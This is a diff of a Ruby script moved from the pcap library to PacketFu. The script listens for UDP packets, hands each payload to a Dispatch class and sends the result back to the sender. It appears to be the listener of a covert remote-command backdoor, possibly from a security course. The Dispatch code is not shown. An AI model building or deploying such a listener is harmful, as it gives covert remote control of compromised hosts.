@@ -2,11 +2,13 @@
 
 require 'optparse'
 require 'rubygems'
-require 'pcaplet'
-require '../lib/packetfu.rb'
+#require 'pcaplet'
+#require '../lib/packetfu.rb'
+require 'packetfu'
 require 'thread'
 require './dispatch.rb'
-include Pcap
+
+include PacketFu
 
 # ---------------------------------------------------------
 # Setup and gather options
@@ -73,24 +75,27 @@ end
 # Listen for attacker
 # ---------------------------------------------------------
 
-cap = Pcap::Capture.open_live(dev)
-cap.setfilter('udp dst port ' + port.to_s)
+#cap = Pcap::Capture.open_live(dev)
+#cap.setfilter('udp dst port ' + port.to_s)
 
-cap.loop do |pkt|
-	attacker_ip = pkt.ip_src.to_s;
-	local_ip = pkt.ip_dst.to_s;
+#cap.loop do |pkt|
 
-	p "Command receievd from " + attacker_ip
-	p Dispatch.new pkt.udp_data.to_s
+cap = Capture.new(:iface => dev, :start => true, :filter => 'udp dst port ' + port.to_s)
 
-	cap.close
+cap.stream.each do |pkt|
+	packet = Packet.parse pkt
+	attacker_ip = packet.ip_saddr.to_s;
+	local_ip = packet.ip_daddr.to_s;
 
-	udp_pkt = PacketFu::UDPPacket.new
+	response = Dispatch.new packet.payload
+
+	udp_pkt = UDPPacket.new
 	udp_pkt.udp_src = rand(0xffff - 1024) + 1024
-	udp_pkt.udp_dst = port
+	udp_pkt.udp_dst = port + 1
 
 	udp_pkt.ip_saddr = local_ip
 	udp_pkt.ip_daddr = attacker_ip
+	udp_pkt.payload = response.to_string.to_s	
 
 	udp_pkt.recalc
 	udp_pkt.to_w(dev)
